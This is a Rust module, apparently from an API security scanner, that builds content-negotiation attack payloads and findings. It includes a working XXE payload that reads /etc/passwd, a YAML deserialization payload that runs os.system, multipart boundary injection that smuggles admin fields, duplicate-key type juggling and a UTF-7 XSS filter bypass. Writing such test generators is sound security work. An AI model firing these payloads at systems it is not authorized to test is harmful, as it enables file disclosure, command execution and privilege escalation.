use serde::{Deserialize, Serialize};
use std::fmt;

/// Severity for content negotiation findings.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum ContentNegotiationSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for ContentNegotiationSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ContentNegotiationSeverity::Info => write!(f, "Info"),
            ContentNegotiationSeverity::Low => write!(f, "Low"),
            ContentNegotiationSeverity::Medium => write!(f, "Medium"),
            ContentNegotiationSeverity::High => write!(f, "High"),
            ContentNegotiationSeverity::Critical => write!(f, "Critical"),
        }
    }
}

/// Accept header manipulation result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AcceptManipulationResult {
    pub accept_header: String,
    pub technique: AcceptManipulationTechnique,
    pub expected_behavior: String,
    pub severity: ContentNegotiationSeverity,
    pub description: String,
}

/// Accept header manipulation techniques.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum AcceptManipulationTechnique {
    WildcardAccept,
    XmlPreference,
    YamlPreference,
    CsvExfiltration,
    SsmlInjection,
    QualityWeightTrick,
    DuplicateAccept,
    EmptyAccept,
    InvalidMimeType,
    AcceptLanguageOverflow,
}

impl fmt::Display for AcceptManipulationTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            AcceptManipulationTechnique::WildcardAccept => write!(f, "Wildcard Accept"),
            AcceptManipulationTechnique::XmlPreference => write!(f, "XML Preference"),
            AcceptManipulationTechnique::YamlPreference => write!(f, "YAML Preference"),
            AcceptManipulationTechnique::CsvExfiltration => write!(f, "CSV Exfiltration"),
            AcceptManipulationTechnique::SsmlInjection => write!(f, "SSML Injection"),
            AcceptManipulationTechnique::QualityWeightTrick => {
                write!(f, "Quality Weight Trick")
            }
            AcceptManipulationTechnique::DuplicateAccept => write!(f, "Duplicate Accept"),
            AcceptManipulationTechnique::EmptyAccept => write!(f, "Empty Accept"),
            AcceptManipulationTechnique::InvalidMimeType => write!(f, "Invalid MIME Type"),
            AcceptManipulationTechnique::AcceptLanguageOverflow => {
                write!(f, "Accept-Language Overflow")
            }
        }
    }
}

/// Serialization confusion (JSON→XML→YAML) result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SerializationConfusionResult {
    pub source_format: SerializationFormat,
    pub target_format: SerializationFormat,
    pub content_type_sent: String,
    pub payload: String,
    pub attack_vector: SerializationAttackVector,
    pub severity: ContentNegotiationSeverity,
    pub description: String,
}

/// Serialization format.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SerializationFormat {
    Json,
    Xml,
    Yaml,
    Toml,
    MessagePack,
    Csv,
}

impl fmt::Display for SerializationFormat {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            SerializationFormat::Json => write!(f, "JSON"),
            SerializationFormat::Xml => write!(f, "XML"),
            SerializationFormat::Yaml => write!(f, "YAML"),
            SerializationFormat::Toml => write!(f, "TOML"),
            SerializationFormat::MessagePack => write!(f, "MessagePack"),
            SerializationFormat::Csv => write!(f, "CSV"),
        }
    }
}

/// Serialization attack vectors.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SerializationAttackVector {
    XxeInjection,
    YamlDeserialization,
    PolyglotPayload,
    TypeJuggling,
    SchemaBypass,
    ParserDifferential,
}

impl fmt::Display for SerializationAttackVector {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            SerializationAttackVector::XxeInjection => write!(f, "XXE Injection"),
            SerializationAttackVector::YamlDeserialization => {
                write!(f, "YAML Deserialization")
            }
            SerializationAttackVector::PolyglotPayload => write!(f, "Polyglot Payload"),
            SerializationAttackVector::TypeJuggling => write!(f, "Type Juggling"),
            SerializationAttackVector::SchemaBypass => write!(f, "Schema Bypass"),
            SerializationAttackVector::ParserDifferential => {
                write!(f, "Parser Differential")
            }
        }
    }
}

/// Content-Type mismatch finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContentTypeMismatchResult {
    pub declared_type: String,
    pub actual_body_format: String,
    pub technique: MismatchTechnique,
    pub severity: ContentNegotiationSeverity,
    pub description: String,
}

/// Content-Type mismatch techniques.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum MismatchTechnique {
    JsonBodyWithXmlHeader,
    XmlBodyWithJsonHeader,
    FormBodyWithJsonHeader,
    MultipartBodyWithJsonHeader,
    BinaryBodyWithTextHeader,
    EmptyContentType,
    CharsetOverride,
}

impl fmt::Display for MismatchTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            MismatchTechnique::JsonBodyWithXmlHeader => write!(f, "JSON Body / XML Header"),
            MismatchTechnique::XmlBodyWithJsonHeader => write!(f, "XML Body / JSON Header"),
            MismatchTechnique::FormBodyWithJsonHeader => write!(f, "Form Body / JSON Header"),
            MismatchTechnique::MultipartBodyWithJsonHeader => {
                write!(f, "Multipart Body / JSON Header")
            }
            MismatchTechnique::BinaryBodyWithTextHeader => {
                write!(f, "Binary Body / Text Header")
            }
            MismatchTechnique::EmptyContentType => write!(f, "Empty Content-Type"),
            MismatchTechnique::CharsetOverride => write!(f, "Charset Override"),
        }
    }
}

/// Multipart boundary manipulation finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MultipartBoundaryResult {
    pub technique: BoundaryTechnique,
    pub content_type_header: String,
    pub payload_snippet: String,
    pub severity: ContentNegotiationSeverity,
    pub description: String,
}

/// Multipart boundary manipulation techniques.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum BoundaryTechnique {
    BoundaryInject,
    DuplicateBoundary,
    NullByteBoundary,
    OverlongBoundary,
    MissingClosingBoundary,
    BoundaryInFilename,
    NestedMultipart,
}

impl fmt::Display for BoundaryTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            BoundaryTechnique::BoundaryInject => write!(f, "Boundary Injection"),
            BoundaryTechnique::DuplicateBoundary => write!(f, "Duplicate Boundary"),
            BoundaryTechnique::NullByteBoundary => write!(f, "Null Byte Boundary"),
            BoundaryTechnique::OverlongBoundary => write!(f, "Overlong Boundary"),
            BoundaryTechnique::MissingClosingBoundary => {
                write!(f, "Missing Closing Boundary")
            }
            BoundaryTechnique::BoundaryInFilename => write!(f, "Boundary in Filename"),
            BoundaryTechnique::NestedMultipart => write!(f, "Nested Multipart"),
        }
    }
}

/// Top-level content negotiation finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContentNegotiationFinding {
    pub category: ContentNegotiationCategory,
    pub severity: ContentNegotiationSeverity,
    pub title: String,
    pub detail: String,
}

/// Content negotiation attack category.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ContentNegotiationCategory {
    AcceptManipulation,
    SerializationConfusion,
    ContentTypeMismatch,
    MultipartBoundaryAbuse,
}

impl fmt::Display for ContentNegotiationCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ContentNegotiationCategory::AcceptManipulation => {
                write!(f, "Accept Header Manipulation")
            }
            ContentNegotiationCategory::SerializationConfusion => {
                write!(f, "Serialization Confusion")
            }
            ContentNegotiationCategory::ContentTypeMismatch => {
                write!(f, "Content-Type Mismatch")
            }
            ContentNegotiationCategory::MultipartBoundaryAbuse => {
                write!(f, "Multipart Boundary Abuse")
            }
        }
    }
}

/// Generate Accept header manipulation payloads.
pub fn generate_accept_manipulations(endpoint: &str) -> Vec<AcceptManipulationResult> {
    vec![
        AcceptManipulationResult {
            accept_header: "*/*".to_string(),
            technique: AcceptManipulationTechnique::WildcardAccept,
            expected_behavior: "Server may return internal serialization format".to_string(),
            severity: ContentNegotiationSeverity::Low,
            description: format!(
                "Send wildcard Accept to {} to discover all supported response formats",
                endpoint
            ),
        },
        AcceptManipulationResult {
            accept_header: "application/xml, text/xml;q=0.9".to_string(),
            technique: AcceptManipulationTechnique::XmlPreference,
            expected_behavior: "Server returns XML response enabling XXE attack surface"
                .to_string(),
            severity: ContentNegotiationSeverity::High,
            description: format!(
                "Request XML response from {} to open XXE attack surface if XML parsing is enabled",
                endpoint
            ),
        },
        AcceptManipulationResult {
            accept_header: "application/x-yaml, text/yaml;q=0.9".to_string(),
            technique: AcceptManipulationTechnique::YamlPreference,
            expected_behavior: "Server returns YAML enabling deserialization attacks".to_string(),
            severity: ContentNegotiationSeverity::High,
            description: format!(
                "Request YAML response from {} to test for unsafe deserialization",
                endpoint
            ),
        },
        AcceptManipulationResult {
            accept_header: "text/csv".to_string(),
            technique: AcceptManipulationTechnique::CsvExfiltration,
            expected_behavior: "Server dumps data as CSV bypassing field-level access control"
                .to_string(),
            severity: ContentNegotiationSeverity::Medium,
            description: format!(
                "Request CSV from {} to test if bulk data export bypasses field permissions",
                endpoint
            ),
        },
        AcceptManipulationResult {
            accept_header: "application/ssml+xml".to_string(),
            technique: AcceptManipulationTechnique::SsmlInjection,
            expected_behavior: "Server may process SSML enabling server-side request".to_string(),
            severity: ContentNegotiationSeverity::Medium,
            description: format!(
                "Request SSML content from {} to test for speech synthesis injection",
                endpoint
            ),
        },
        AcceptManipulationResult {
            accept_header: "application/json;q=0.1, application/xml;q=1.0".to_string(),
            technique: AcceptManipulationTechnique::QualityWeightTrick,
            expected_behavior: "Server prefers XML over JSON due to quality weights".to_string(),
            severity: ContentNegotiationSeverity::Medium,
            description: format!(
                "Manipulate Accept quality weights on {} to force server into less-secure format",
                endpoint
            ),
        },
        AcceptManipulationResult {
            accept_header: "application/json, application/json".to_string(),
            technique: AcceptManipulationTechnique::DuplicateAccept,
            expected_behavior: "Parser confusion from duplicate Accept values".to_string(),
            severity: ContentNegotiationSeverity::Low,
            description: format!(
                "Send duplicate Accept header values to {} to test parser robustness",
                endpoint
            ),
        },
        AcceptManipulationResult {
            accept_header: String::new(),
            technique: AcceptManipulationTechnique::EmptyAccept,
            expected_behavior: "Server may return default format exposing internal details"
                .to_string(),
            severity: ContentNegotiationSeverity::Low,
            description: format!(
                "Send empty Accept header to {} to discover default response format",
                endpoint
            ),
        },
        AcceptManipulationResult {
            accept_header: "application/x-internal-debug".to_string(),
            technique: AcceptManipulationTechnique::InvalidMimeType,
            expected_behavior: "Server may return debug/error information for unknown type"
                .to_string(),
            severity: ContentNegotiationSeverity::Medium,
            description: format!(
                "Send fabricated MIME type to {} to trigger error responses with internal details",
                endpoint
            ),
        },
        AcceptManipulationResult {
            accept_header: format!("application/json; {}", "lang=xx,".repeat(500)),
            technique: AcceptManipulationTechnique::AcceptLanguageOverflow,
            expected_behavior: "Excessive Accept parameters may cause parser buffer overflow"
                .to_string(),
            severity: ContentNegotiationSeverity::Medium,
            description: format!(
                "Send oversized Accept parameters to {} to test header parser limits",
                endpoint
            ),
        },
    ]
}

/// Generate serialization confusion payloads (JSON↔XML↔YAML).
pub fn generate_serialization_confusion_payloads(
    json_body: &str,
) -> Vec<SerializationConfusionResult> {
    let mut results = Vec::new();

    results.push(SerializationConfusionResult {
        source_format: SerializationFormat::Json,
        target_format: SerializationFormat::Xml,
        content_type_sent: "application/xml".to_string(),
        payload: format!(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>"
        ),
        attack_vector: SerializationAttackVector::XxeInjection,
        severity: ContentNegotiationSeverity::Critical,
        description: "Send XML body with XXE payload where JSON is expected to test if server falls back to XML parsing".to_string(),
    });

    results.push(SerializationConfusionResult {
        source_format: SerializationFormat::Json,
        target_format: SerializationFormat::Yaml,
        content_type_sent: "application/x-yaml".to_string(),
        payload: "!!python/object/apply:os.system ['id']".to_string(),
        attack_vector: SerializationAttackVector::YamlDeserialization,
        severity: ContentNegotiationSeverity::Critical,
        description: "Send YAML body with deserialization payload where JSON is expected to test for unsafe YAML parsing".to_string(),
    });

    results.push(SerializationConfusionResult {
        source_format: SerializationFormat::Json,
        target_format: SerializationFormat::Xml,
        content_type_sent: "application/json".to_string(),
        payload: format!(
            "{{\"data\": \"<?xml version='1.0'?><test/>\"}}",
        ),
        attack_vector: SerializationAttackVector::PolyglotPayload,
        severity: ContentNegotiationSeverity::High,
        description: "Embed XML inside JSON string value to test if secondary parsing occurs on field contents".to_string(),
    });

    results.push(SerializationConfusionResult {
        source_format: SerializationFormat::Json,
        target_format: SerializationFormat::Json,
        content_type_sent: "application/json".to_string(),
        payload: "{\"amount\": \"0\", \"amount\": 99999}".to_string(),
        attack_vector: SerializationAttackVector::TypeJuggling,
        severity: ContentNegotiationSeverity::High,
        description: "Duplicate JSON keys with different types to exploit parser-specific key precedence (first vs last wins)".to_string(),
    });

    results.push(SerializationConfusionResult {
        source_format: SerializationFormat::Json,
        target_format: SerializationFormat::Xml,
        content_type_sent: "text/xml".to_string(),
        payload: "<root><admin>true</admin></root>".to_string(),
        attack_vector: SerializationAttackVector::SchemaBypass,
        severity: ContentNegotiationSeverity::High,
        description:
            "Switch to XML format to inject fields that JSON schema validation would reject"
                .to_string(),
    });

    results.push(SerializationConfusionResult {
        source_format: SerializationFormat::Json,
        target_format: SerializationFormat::Json,
        content_type_sent: "application/json".to_string(),
        payload: format!("{{\"data\": {}e0}}", &json_body.get(..json_body.len().min(20)).unwrap_or("{}")),
        attack_vector: SerializationAttackVector::ParserDifferential,
        severity: ContentNegotiationSeverity::Medium,
        description: "Use JSON edge cases (trailing content, scientific notation) to exploit differences between parser implementations".to_string(),
    });

    results
}

/// Generate Content-Type mismatch test cases.
pub fn generate_content_type_mismatches() -> Vec<ContentTypeMismatchResult> {
    vec![
        ContentTypeMismatchResult {
            declared_type: "application/xml".to_string(),
            actual_body_format: "JSON".to_string(),
            technique: MismatchTechnique::JsonBodyWithXmlHeader,
            severity: ContentNegotiationSeverity::High,
            description: "Send JSON body with XML Content-Type to test if server parses body regardless of declared type".to_string(),
        },
        ContentTypeMismatchResult {
            declared_type: "application/json".to_string(),
            actual_body_format: "XML".to_string(),
            technique: MismatchTechnique::XmlBodyWithJsonHeader,
            severity: ContentNegotiationSeverity::High,
            description: "Send XML body (with XXE) with JSON Content-Type to bypass content-type-based WAF rules".to_string(),
        },
        ContentTypeMismatchResult {
            declared_type: "application/json".to_string(),
            actual_body_format: "Form URL-encoded".to_string(),
            technique: MismatchTechnique::FormBodyWithJsonHeader,
            severity: ContentNegotiationSeverity::Medium,
            description: "Send form-encoded body with JSON Content-Type to test parser fallback behavior".to_string(),
        },
        ContentTypeMismatchResult {
            declared_type: "application/json".to_string(),
            actual_body_format: "Multipart form-data".to_string(),
            technique: MismatchTechnique::MultipartBodyWithJsonHeader,
            severity: ContentNegotiationSeverity::Medium,
            description: "Send multipart body with JSON Content-Type to test for file upload via content-type confusion".to_string(),
        },
        ContentTypeMismatchResult {
            declared_type: "text/plain".to_string(),
            actual_body_format: "Binary".to_string(),
            technique: MismatchTechnique::BinaryBodyWithTextHeader,
            severity: ContentNegotiationSeverity::Low,
            description: "Send binary body with text Content-Type to test server binary handling under text declaration".to_string(),
        },
        ContentTypeMismatchResult {
            declared_type: String::new(),
            actual_body_format: "JSON".to_string(),
            technique: MismatchTechnique::EmptyContentType,
            severity: ContentNegotiationSeverity::Medium,
            description: "Send body with empty Content-Type to test server content-sniffing behavior".to_string(),
        },
        ContentTypeMismatchResult {
            declared_type: "application/json; charset=utf-7".to_string(),
            actual_body_format: "JSON with UTF-7 charset".to_string(),
            technique: MismatchTechnique::CharsetOverride,
            severity: ContentNegotiationSeverity::High,
            description: "Override charset to UTF-7 to bypass XSS filters via charset-dependent encoding".to_string(),
        },
    ]
}

/// Generate multipart boundary manipulation payloads.
pub fn generate_boundary_manipulations(original_boundary: &str) -> Vec<MultipartBoundaryResult> {
    let mut results = Vec::new();

    results.push(MultipartBoundaryResult {
        technique: BoundaryTechnique::BoundaryInject,
        content_type_header: format!(
            "multipart/form-data; boundary={}; boundary=injected",
            original_boundary
        ),
        payload_snippet: format!(
            "--injected\r\nContent-Disposition: form-data; name=\"admin\"\r\n\r\ntrue\r\n--injected--"
        ),
        severity: ContentNegotiationSeverity::High,
        description: "Inject second boundary parameter to smuggle additional form fields past validation".to_string(),
    });

    results.push(MultipartBoundaryResult {
        technique: BoundaryTechnique::DuplicateBoundary,
        content_type_header: format!(
            "multipart/form-data; boundary=\"{}\"; boundary=\"{}alt\"",
            original_boundary, original_boundary
        ),
        payload_snippet: format!(
            "--{}alt\r\nContent-Disposition: form-data; name=\"role\"\r\n\r\nadmin\r\n--{}alt--",
            original_boundary, original_boundary
        ),
        severity: ContentNegotiationSeverity::High,
        description:
            "Send duplicate boundary parameters to exploit parser picking first vs last value"
                .to_string(),
    });

    results.push(MultipartBoundaryResult {
        technique: BoundaryTechnique::NullByteBoundary,
        content_type_header: format!(
            "multipart/form-data; boundary={}%00extra",
            original_boundary
        ),
        payload_snippet: format!(
            "--{}\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nmalicious\r\n--{}--",
            original_boundary, original_boundary
        ),
        severity: ContentNegotiationSeverity::High,
        description: "Insert null byte in boundary to cause C-string truncation in native parsers"
            .to_string(),
    });

    let long_boundary = "X".repeat(8192);
    results.push(MultipartBoundaryResult {
        technique: BoundaryTechnique::OverlongBoundary,
        content_type_header: format!("multipart/form-data; boundary={}", long_boundary),
        payload_snippet: format!(
            "--{}\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\ndata\r\n--{}--",
            long_boundary, long_boundary
        ),
        severity: ContentNegotiationSeverity::Medium,
        description: "Use 8KB boundary string to test parser buffer allocation limits".to_string(),
    });

    results.push(MultipartBoundaryResult {
        technique: BoundaryTechnique::MissingClosingBoundary,
        content_type_header: format!(
            "multipart/form-data; boundary={}",
            original_boundary
        ),
        payload_snippet: format!(
            "--{}\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nno closing boundary",
            original_boundary
        ),
        severity: ContentNegotiationSeverity::Medium,
        description: "Omit closing boundary to test if parser reads past intended content into adjacent memory".to_string(),
    });

    results.push(MultipartBoundaryResult {
        technique: BoundaryTechnique::BoundaryInFilename,
        content_type_header: format!(
            "multipart/form-data; boundary={}",
            original_boundary
        ),
        payload_snippet: format!(
            "--{}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"--{}\\r\\nContent-Disposition: form-data; name=admin\\r\\n\\r\\ntrue\"\r\n\r\nfile content\r\n--{}--",
            original_boundary, original_boundary, original_boundary
        ),
        severity: ContentNegotiationSeverity::High,
        description: "Embed boundary sequence inside filename to inject additional form fields".to_string(),
    });

    results.push(MultipartBoundaryResult {
        technique: BoundaryTechnique::NestedMultipart,
        content_type_header: format!(
            "multipart/form-data; boundary={}",
            original_boundary
        ),
        payload_snippet: format!(
            "--{}\r\nContent-Type: multipart/form-data; boundary=inner\r\n\r\n--inner\r\nContent-Disposition: form-data; name=\"nested\"\r\n\r\nhidden\r\n--inner--\r\n--{}--",
            original_boundary, original_boundary
        ),
        severity: ContentNegotiationSeverity::Medium,
        description: "Nest multipart inside multipart to test recursive parsing and field extraction".to_string(),
    });

    results
}

/// Run the full content negotiation attack analysis.
pub fn run_content_negotiation_analysis(
    endpoint: &str,
    json_body: Option<&str>,
    multipart_boundary: Option<&str>,
) -> Vec<ContentNegotiationFinding> {
    let mut findings = Vec::new();

    let accept_manips = generate_accept_manipulations(endpoint);
    for manip in &accept_manips {
        findings.push(ContentNegotiationFinding {
            category: ContentNegotiationCategory::AcceptManipulation,
            severity: manip.severity,
            title: format!("{} on {}", manip.technique, endpoint),
            detail: manip.description.clone(),
        });
    }

    if let Some(body) = json_body {
        let serial_payloads = generate_serialization_confusion_payloads(body);
        for payload in &serial_payloads {
            findings.push(ContentNegotiationFinding {
                category: ContentNegotiationCategory::SerializationConfusion,
                severity: payload.severity,
                title: format!(
                    "{}: {} → {}",
                    payload.attack_vector, payload.source_format, payload.target_format
                ),
                detail: payload.description.clone(),
            });
        }
    }

    let mismatches = generate_content_type_mismatches();
    for mismatch in &mismatches {
        findings.push(ContentNegotiationFinding {
            category: ContentNegotiationCategory::ContentTypeMismatch,
            severity: mismatch.severity,
            title: format!("{}", mismatch.technique),
            detail: mismatch.description.clone(),
        });
    }

    if let Some(boundary) = multipart_boundary {
        let boundary_attacks = generate_boundary_manipulations(boundary);
        for attack in &boundary_attacks {
            findings.push(ContentNegotiationFinding {
                category: ContentNegotiationCategory::MultipartBoundaryAbuse,
                severity: attack.severity,
                title: format!("{}", attack.technique),
                detail: attack.description.clone(),
            });
        }
    }

    findings
}
